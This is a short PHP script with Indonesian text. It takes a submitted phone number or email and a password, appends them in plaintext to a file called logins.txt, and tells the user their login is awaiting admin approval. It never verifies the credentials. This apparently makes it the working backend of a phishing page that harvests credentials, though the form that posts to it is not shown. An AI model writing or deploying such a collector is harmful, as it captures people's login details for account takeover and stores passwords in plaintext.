<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nomor_email = $_POST["nomor_email"];
    $password = $_POST["password"];
    
    $file = "logins.txt";
    $data = "NOMOR/EMAIL: $nomor_email | PASSWORD: $password | STATUS: NON AKTIF\n";
    file_put_contents($file, $data, FILE_APPEND);
    
    echo "Login Anda sedang menunggu persetujuan admin.";
}
?>
